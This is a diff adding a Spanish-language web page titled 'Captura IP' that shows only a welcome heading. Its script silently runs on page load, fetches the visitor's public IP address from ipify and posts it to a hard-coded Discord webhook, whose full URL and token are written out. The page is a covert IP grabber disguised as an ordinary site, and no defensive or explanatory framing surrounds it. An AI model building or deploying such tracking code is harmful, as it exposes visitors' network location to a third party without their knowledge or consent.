@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura IP</title>
+</head>
+<body>
+    <h1>Bienvenido a mi página web</h1>
+
+    <script>
+        // Usamos el servicio IPify para obtener la IP pública del visitante
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                // Obtén la IP pública
+                const userIP = data.ip;
+                console.log("La IP pública es: ", userIP);
+
+                // Configura el Webhook de Discord
+                const discordWebhookURL = 'https://discord.com/api/webhooks/1331770000918315020/IzTMCrhpt5RCxNE79afLLRfPGJKEzsiHKVsvdYF8dPP9Z13Lbgts48SmJOamu_w-2VrS';
+
+                // Crea el mensaje que quieres enviar
+                const payload = {
+                    content: `¡Alguien visitó tu página! La IP es: ${userIP}`
+                };
+
+                // Enviar la IP al Discord Webhook usando una petición POST
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("IP enviada correctamente a Discord.");
+                    } else {
+                        console.error("Hubo un error al enviar la IP.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar la IP a Discord: ", error);
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener la IP pública: ", error);
+            });
+    </script>
+</body>
+</html>
